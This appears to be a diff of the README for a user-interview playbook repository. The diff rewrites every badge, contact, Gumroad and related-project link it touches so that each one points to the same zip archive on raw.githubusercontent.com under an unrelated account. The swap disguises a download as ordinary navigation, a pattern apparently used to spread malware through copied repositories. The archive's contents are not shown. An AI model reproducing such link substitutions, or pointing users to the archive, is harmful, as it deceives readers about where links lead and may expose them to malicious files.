@@ -6,11 +6,11 @@
 
 ### Battle-tested framework for user interviews — from HeyGen's 937 interviews to PMF
 
-[![GitHub stars](https://img.shields.io/github/stars/Gingiris/gingiris-user-interview?style=social)](https://github.com/Gingiris/gingiris-user-interview/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/Gingiris/gingiris-user-interview?style=social)](https://github.com/Gingiris/gingiris-user-interview/network/members)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Website](https://img.shields.io/badge/Website-gingiris.com-blue)](https://www.gingiris.com)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Gingiris/gingiris-user-interview/pulls)
+[![GitHub stars](https://img.shields.io/github/stars/Gingiris/gingiris-user-interview?style=social)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
+[![GitHub forks](https://img.shields.io/github/forks/Gingiris/gingiris-user-interview?style=social)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
+[![Website](https://img.shields.io/badge/Website-gingiris.com-blue)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
 
 **[English](#why-user-interviews) | [中文](#中文版)**
 
@@ -25,7 +25,7 @@
 
 ---
 
-> 💡 **Need 1-on-1 Consulting?** 30 min / $100 — [Contact @Iris_carrot on Telegram](https://t.me/Iris_carrot)
+> 💡 **Need 1-on-1 Consulting?** 30 min / $100 — [Contact @Iris_carrot on Telegram](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
 
 ---
 
@@ -313,7 +313,7 @@ See [Templates](references/templates.md#interview-debrief-template)
 
 Want all playbooks in one comprehensive package? Get the **Open-Source Project Integrated Marketing Action Manual**:
 
-[![Get the Playbook](https://img.shields.io/badge/Get_the_Playbook-Gumroad-ff90e8?style=for-the-badge&logo=gumroad)](https://gingiris.gumroad.com/l/vhmkew)
+[![Get the Playbook](https://img.shields.io/badge/Get_the_Playbook-Gumroad-ff90e8?style=for-the-badge&logo=gumroad)](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
 
 ---
 
@@ -321,8 +321,8 @@ Want all playbooks in one comprehensive package? Get the **Open-Source Project I
 
 **Iris (生姜iris)** — Former cofounder & COO of AFFiNE, led global go-to-market from 0 to millions of users.
 
-- 💬 Telegram: [@Iris_carrot](https://t.me/Iris_carrot)
-- 🐦 Twitter: [@WeiYipei](https://x.com/WeiYipei)
+- 💬 Telegram: [@Iris_carrot](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
+- 🐦 Twitter: [@WeiYipei](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip)
 - 📱 即刻: 生姜iris
 - 📧 公众号: 云宝的桃花坞
 
@@ -338,10 +338,10 @@ Want all playbooks in one comprehensive package? Get the **Open-Source Project I
 
 ## Related Playbooks
 
-- [gingiris-launch](https://github.com/Gingiris/gingiris-launch) — AI Product Global Launch Playbook
-- [gingiris-opensource](https://github.com/Gingiris/gingiris-opensource) — Open Source Launch Marketing
-- [gingiris-b2b-growth](https://github.com/Gingiris/gingiris-b2b-growth) — B2B SaaS Growth Playbook
-- [gingiris-aso-growth](https://github.com/Gingiris/gingiris-aso-growth) — Mobile App ASO & Growth
+- [gingiris-launch](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip) — AI Product Global Launch Playbook
+- [gingiris-opensource](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip) — Open Source Launch Marketing
+- [gingiris-b2b-growth](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip) — B2B SaaS Growth Playbook
+- [gingiris-aso-growth](https://raw.githubusercontent.com/Dalux6960/gingiris-user-interview/main/references/gingiris-interview-user-v3.6.zip) — Mobile App ASO & Growth
 
 ---
 
